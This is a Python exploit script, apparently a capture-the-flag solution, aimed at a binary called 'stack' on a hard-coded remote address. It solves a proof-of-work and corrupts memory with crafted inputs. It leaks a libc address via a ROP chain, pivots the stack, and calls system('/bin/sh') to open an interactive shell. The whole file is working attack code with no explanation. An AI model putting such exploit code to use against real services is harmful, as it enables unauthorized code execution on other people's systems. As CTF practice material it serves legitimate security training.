#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import hashlib
import string
import itertools

bin_file = './stack'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'47.75.9.127', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_c              = addr_bss + 0x20
addr_stack          = (addr_bss + 0x3a0) & ~0xff

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def solve_pow(conn):
    conn.recvuntil('+')
    salt    = conn.recv(16)
    hashed  = conn.recvline().split()[-1]
    info('salt : ' + salt)
    info('hash : ' + hashed)

    chars = string.ascii_letters + string.digits
    for el in itertools.permutations(chars, 4):
        x = ''.join(el)
        if hashlib.sha256(x+salt).hexdigest() == hashed:
            info('solve xxxx : ' + x)
            conn.sendline(x)
            break

def attack(conn):
    conn.sendlineafter('size: ', '0')
    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x68))

    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x68 + 1))
    conn.sendlineafter('content: ', 'X'*2)

    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x68))
    for _ in range(0x82):
        conn.sendlineafter('content: ', 'X')

    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x60 + 2))
    for _ in range((addr_stack >> 16) & 0xff):
        conn.sendlineafter('content: ', 'X')

    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x60 + 1))
    for _ in range((addr_stack >> 8) & 0xff):
        conn.sendlineafter('content: ', 'X')

    conn.sendlineafter('content: ', 'a'*0x30 + chr(0x58))
    conn.sendlineafter('content: ', '')

    rop = ROP(binf)
    rop.puts(addr_got_main)
    rop.raw(rop.rdi)
    rop.raw(constants.STDIN_FILENO)
    rop.raw(0x00400971)
    rop.raw(addr_stack + 0x100)
    rop.raw(0xdeadbeef)
    rop.read()
    rop.migrate(addr_stack + 0x100)

    exploit  = 'a'.ljust(addr_stack - addr_c, '\x00')
    exploit += p64(0xdeadbeef)
    exploit += str(rop)
    conn.send(exploit)

    conn.readline()
    addr_libc_main = u(conn.readline()[:-1])
    libc.address = addr_libc_main - offset_libc_main
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)
    conn.send(str(rop))

#==========

if __name__=='__main__':
    while True:
        try:
            conn = communicate(env.mode, **env.target)
            if env.check('remote'):
                solve_pow(conn)
            attack(conn)
            break
        except:
            conn.close()

        if env.check('debug'):
            break
    conn.interactive()
   
#==========
